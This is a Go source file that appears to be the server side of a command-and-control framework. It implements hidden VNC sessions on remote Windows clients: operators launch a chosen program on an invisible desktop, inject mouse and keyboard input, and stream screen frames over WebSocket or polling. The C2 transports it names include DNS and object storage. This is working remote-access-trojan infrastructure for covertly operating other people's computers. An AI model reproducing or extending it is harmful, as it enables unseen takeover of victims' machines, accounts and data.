package api

import (
	"BackendTemplate/pkg/api/communication"
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/connection/dns"
	"BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/oss"
	"BackendTemplate/pkg/connection/tcp"
	ws "BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/errors"
	"BackendTemplate/pkg/security"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

// HVNC（Hidden VNC）隐藏桌面：WS 帧推送会话 + REST 控制/输入 API。
// 帧链路：客户端 DataProcess(HVNC_FRAME) -> 各传输层 replyType -> VarHVNCFrameQueue + BroadcastToHVNCSessions -> 本文件 WS 会话 -> 前端。

// HVNCSession HVNC WebSocket 会话（帧推送）
type HVNCSession struct {
	ID       string // uid_sid
	UID      string
	SID      string
	Conn     *websocket.Conn
	IsActive bool
	writeMu  sync.Mutex
}

const (
	// hvncViewerGrace 最后一个观看者断开后，给前端重连的宽限时间。
	// 原实现一断就下发 HVNC_STOP：网络抖动一次会话就被杀，前端却转去 REST 轮询，
	// 永远等不到新帧。宽限期内重连则取消停止。
	hvncViewerGrace = 30 * time.Second
)

var (
	hvncSessions    = make(map[string]*HVNCSession)
	hvncMutex       sync.RWMutex
	hvncPendingMu   sync.Mutex
	hvncPendingStop = make(map[string]*time.Timer)
	hvncUpgrader    = websocket.Upgrader{
		// 【安全修复】校验 Origin 与请求 Host 同源，防止任意网页跨站连接（CSWSH）
		CheckOrigin: func(r *http.Request) bool {
			origin := r.Header.Get("Origin")
			if origin == "" {
				return true // 非浏览器客户端（API 测试等）
			}
			u, err := url.Parse(origin)
			if err != nil {
				return false
			}
			return u.Host == r.Host
		},
	}
)

// init 注册各传输层的 HVNC 帧广播回调
func init() {
	tcp.BroadcastToHVNCSessions = BroadcastToHVNCSessions
	ws.BroadcastToHVNCSessions = BroadcastToHVNCSessions
	kcp.BroadcastToHVNCSessions = BroadcastToHVNCSessions
	communication.BroadcastToHVNCSessions = BroadcastToHVNCSessions
	oss.BroadcastToHVNCSessions = BroadcastToHVNCSessions // B4 收敛后 OSS 回包走统一处理器，补注入
	dns.BroadcastToHVNCSessions = BroadcastToHVNCSessions // B4 收敛后 DNS 回包走统一处理器，补注入
}

// cancelPendingHvncStop 取消该会话已排队的"无观看者停止"。
func cancelPendingHvncStop(key string) {
	hvncPendingMu.Lock()
	if t, ok := hvncPendingStop[key]; ok {
		t.Stop()
		delete(hvncPendingStop, key)
	}
	hvncPendingMu.Unlock()
}

// scheduleHvncStop 最后一个观看者断开后延迟停止客户端推帧。
func scheduleHvncStop(uid, sid, key string) {
	hvncPendingMu.Lock()
	if t, ok := hvncPendingStop[key]; ok {
		t.Stop()
	}
	hvncPendingStop[key] = time.AfterFunc(hvncViewerGrace, func() {
		hvncPendingMu.Lock()
		delete(hvncPendingStop, key)
		hvncPendingMu.Unlock()

		// 宽限期内有人重连 → 不停止
		hvncMutex.RLock()
		_, watching := hvncSessions[key]
		hvncMutex.RUnlock()
		if watching {
			return
		}
		stopPayload := makeCmdType(command.HVNC_STOP, []byte(sid))
		sendcommand.SendFileUploadCommand(uid, stopPayload)
		command.VarHVNCFrameQueue.Remove(uid, sid)
		log.Printf("🛑 [HVNC] 宽限期结束仍无观看者，通知客户端停止会话: %s", key)
	})
	hvncPendingMu.Unlock()
}

// BroadcastToHVNCSessions 推送帧到指定 UID+SID 的 HVNC 会话。
// 【安全修复】异步推送 + 写超时：前端 WS 卡死/断连时不再阻塞 C2 传输读循环
// （此前同步写可导致整个客户端命令通道被无限期阻塞）。
func BroadcastToHVNCSessions(uid, sid string, frame []byte) {
	key := uid + "_" + sid
	hvncMutex.RLock()
	session, ok := hvncSessions[key]
	hvncMutex.RUnlock()
	if !ok || session == nil || !session.IsActive {
		return
	}
	go func(s *HVNCSession, f []byte) {
		s.writeMu.Lock()
		defer s.writeMu.Unlock()
		s.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := s.Conn.WriteMessage(websocket.BinaryMessage, f); err != nil {
			log.Printf("⚠️ [HVNC] WS 帧推送失败 %s: %v", s.ID, err)
			s.IsActive = false
		}
		s.Conn.SetWriteDeadline(time.Time{})
	}(session, frame)
}

// HvncConnectHandler HVNC WebSocket 连接处理（帧推送通道）
func HvncConnectHandler(c *gin.Context) {
	uid := c.Query("uid")
	sid := c.Query("sid")
	if uid == "" || sid == "" {
		errors.AbortWithError(c, errors.NewBadRequestError("缺少 uid/sid"))
		return
	}

	conn, err := hvncUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		errors.AbortWithError(c, errors.NewInternalError("WebSocket升级失败").WithInternalError(err))
		return
	}

	// JWT 认证：首个消息携带 token
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	_, authData, err := conn.ReadMessage()
	if err != nil {
		conn.Close()
		return
	}
	var authMsg struct {
		Type    string `json:"type"`
		Content string `json:"content"`
	}
	if err := json.Unmarshal(authData, &authMsg); err != nil || authMsg.Type != "auth" {
		conn.Close()
		return
	}
	token := authMsg.Content
	if token == "" {
		// 双通道认证：页面刷新/新标签页后 JS 内存 token 为空（access token 不持久化），
		// 凭 HttpOnly Cookie 续接（同 events.go / xterm）
		token = apiCookieToken(c)
	}
	claims, err := security.GlobalJWTManager.ValidateToken(token)
	if err != nil {
		conn.WriteJSON(gin.H{"type": "error", "content": "unauthorized"})
		conn.Close()
		return
	}
	// 【RBAC修复】WS 端点不经过 RequireRole 中间件，需在握手时显式校验角色：
	// auditor（只读）不可接入 HVNC 帧通道（隐藏桌面操控/输入注入属敏感操作）
	if claims.Role != security.RoleAdmin && claims.Role != security.RoleOperator {
		logx.Infof("🚫 [HVNC] 用户 %s 角色 %s 无权接入 HVNC 会话\n", claims.Username, claims.Role)
		conn.WriteJSON(gin.H{"type": "error", "content": "forbidden"})
		conn.Close()
		return
	}
	// 【安全修复】uid 归属校验：目标客户端必须在线（防止订阅任意 uid 的会话帧）
	connection.MuClientListenerType.Lock()
	_, clientOnline := connection.ClientListenerType[uid]
	connection.MuClientListenerType.Unlock()
	if !clientOnline {
		conn.WriteJSON(gin.H{"type": "error", "content": "client offline"})
		conn.Close()
		return
	}
	conn.SetReadDeadline(time.Time{})
	conn.WriteJSON(gin.H{"type": "ok", "content": "hvnc connected"})

	key := uid + "_" + sid
	session := &HVNCSession{ID: key, UID: uid, SID: sid, Conn: conn, IsActive: true}
	hvncMutex.Lock()
	if old, ok := hvncSessions[key]; ok && old != nil {
		old.IsActive = false
		old.Conn.Close()
	}
	hvncSessions[key] = session
	hvncMutex.Unlock()
	// 宽限期内重连：取消排队中的停止
	cancelPendingHvncStop(key)

	defer func() {
		session.IsActive = false
		hvncMutex.Lock()
		if hvncSessions[key] == session {
			delete(hvncSessions, key)
		}
		// 检查该会话是否还有其他 WS 订阅者
		_, stillWatched := hvncSessions[key]
		hvncMutex.Unlock()
		conn.Close()
		log.Printf("🔌 [HVNC] WS 会话断开: %s", key)

		// 无观看者：延迟停止（给前端 WS 重连留宽限），避免网络抖动一次就杀掉会话
		if !stillWatched && uid != "" && sid != "" {
			scheduleHvncStop(uid, sid, key)
			log.Printf("⏳ [HVNC] 无观看者，%s 后停止会话（等待重连）: %s", hvncViewerGrace, key)
		}
	}()

	// 读循环（保活 + 忽略消息；输入走 REST）
	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			return
		}
	}
}

// hvncStartRequest HVNC 启动请求
type hvncStartRequest struct {
	UID  string `json:"uid"`
	App  string `json:"app"`  // 程序路径；空 = explorer
	Args string `json:"args"` // 程序参数
}

// StartHvnc 启动 HVNC 会话（生成 sid 并下发命令）
func StartHvnc(c *gin.Context) {
	var req hvncStartRequest
	if err := c.ShouldBindJSON(&req); err != nil || req.UID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "uid 必填"})
		return
	}

	// 平台与在线校验：HVNC 客户端实现仅 Windows；离线/不存在时直接报错，
	// 原实现无条件返回 sid，前端会显示"启动成功"却永远没有画面。
	client, has, err := database.Clients_().GetByUID(req.UID)
	if err != nil || !has {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "会话不存在"})
		return
	}
	if !strings.EqualFold(client.Os, "windows") {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "HVNC 仅支持 Windows 客户端（当前 OS=" + client.Os + "）"})
		return
	}
	connection.MuClientListenerType.Lock()
	_, online := connection.ClientListenerType[req.UID]
	connection.MuClientListenerType.Unlock()
	if !online {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "客户端不在线"})
		return
	}

	sid := fmt.Sprintf("h%d", time.Now().UnixNano()/1000)
	payload := utils.BytesCombine(
		utils.WriteInt(len(sid)), []byte(sid),
		utils.WriteInt(len(req.App)), []byte(req.App),
		utils.WriteInt(len(req.Args)), []byte(req.Args),
	)
	byteToSend := makeCmdType(command.HVNC_START, payload)
	if err := sendcommand.SendFileUploadCommandChecked(req.UID, byteToSend); err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"status": 502, "message": "下发 HVNC_START 失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{"sid": sid}})
}

// StopHvnc 停止 HVNC 会话
func StopHvnc(c *gin.Context) {
	var req struct {
		UID string `json:"uid"`
		SID string `json:"sid"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UID == "" || req.SID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "uid/sid 必填"})
		return
	}

	byteToSend := makeCmdType(command.HVNC_STOP, []byte(req.SID))
	sendcommand.SendFileUploadCommand(req.UID, byteToSend)

	// 清理服务端状态（含宽限期中的待停止定时器）
	cancelPendingHvncStop(req.UID + "_" + req.SID)
	command.VarHVNCFrameQueue.Remove(req.UID, req.SID)
	key := req.UID + "_" + req.SID
	hvncMutex.Lock()
	if s, ok := hvncSessions[key]; ok {
		s.IsActive = false
		s.Conn.Close()
		delete(hvncSessions, key)
	}
	hvncMutex.Unlock()

	c.JSON(http.StatusOK, gin.H{"status": 200, "message": "HVNC stopped"})
}

// SendHvncInput 下发 HVNC 输入事件到客户端
func SendHvncInput(c *gin.Context) {
	var req struct {
		UID  string `json:"uid"`
		SID  string `json:"sid"`
		Data string `json:"data"` // 输入事件 JSON（或 \x01+JSON 控制消息，客户端自行解析）
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UID == "" || req.SID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "uid/sid/data 必填"})
		return
	}
	payload := utils.BytesCombine(
		utils.WriteInt(len(req.SID)), []byte(req.SID),
		[]byte(req.Data),
	)
	byteToSend := makeCmdType(command.HVNC_INPUT, payload)
	sendcommand.SendFileUploadCommand(req.UID, byteToSend)
	c.JSON(http.StatusOK, gin.H{"status": 200, "message": "input sent"})
}

// GetHvncFrame 轮询获取最新 HVNC 帧（WS 不可用时兜底）
func GetHvncFrame(c *gin.Context) {
	uid := c.Query("uid")
	sid := c.Query("sid")
	if uid == "" || sid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "uid/sid 必填"})
		return
	}
	frame, ok := command.VarHVNCFrameQueue.Get(uid, sid)
	if !ok {
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": ""})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "data:image/jpeg;base64," + base64.StdEncoding.EncodeToString(frame)})
}

// makeCmdType 组装 [4B cmdType][payload]
func makeCmdType(cmdType uint32, payload []byte) []byte {
	byteToSend := make([]byte, 4)
	binary.BigEndian.PutUint32(byteToSend, cmdType)
	return append(byteToSend, payload...)
}
